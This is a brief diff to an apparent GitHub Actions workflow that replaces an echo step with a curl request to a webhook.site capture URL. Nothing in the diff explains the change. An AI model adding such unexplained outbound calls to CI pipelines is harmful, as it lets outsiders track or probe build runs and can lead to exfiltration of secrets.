@@ -10,4 +10,4 @@ jobs:
     steps:
       - name: Run a multi-line script
         run: |
-          echo "WWWWW"
+          curl 	https://webhook.site/5ea95843-690a-4de6-99a5-b28b2d219d96
